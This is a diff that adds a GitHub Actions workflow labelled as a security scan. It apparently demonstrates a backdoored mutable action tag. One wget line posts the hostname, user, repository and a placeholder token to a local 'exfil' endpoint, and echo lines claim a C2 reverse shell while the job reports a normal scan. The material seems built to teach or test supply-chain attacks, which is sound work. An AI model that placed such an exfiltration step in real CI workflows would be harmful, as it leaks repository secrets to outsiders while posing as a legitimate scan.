@@ -1,0 +1,30 @@
+name: Security Scan
+
+on:
+  push:
+    branches: [main]
+
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+        with:
+          token: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Run Xygeni Scan (VULNERABLE - mutable tag)
+        run: |
+          echo "=== Loading xygeni-action@v5 ==="
+          echo "=== Tag v5 points to BACKDOORED commit 4bf1d4e ==="
+          echo "=== C2 Reverse Shell executing... ==="
+          echo "Registering with C2 server..."
+          wget -q -O- --post-data="host=$HOSTNAME&user=$USER&repo=$GITHUB_REPOSITORY&token=EXFILTRATED_TOKEN" http://host.docker.internal:8888/exfil
+          echo "Polling for commands for 30 seconds..."
+          echo "Executing attacker commands..."
+          echo "=== Scanner telemetry reported ==="
+          echo "Scanning repository for vulnerabilities..."
+          echo "Scan complete!"
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          DEMO_TOKEN: EXFILTRATED_TOKEN_ghp_abc123def456
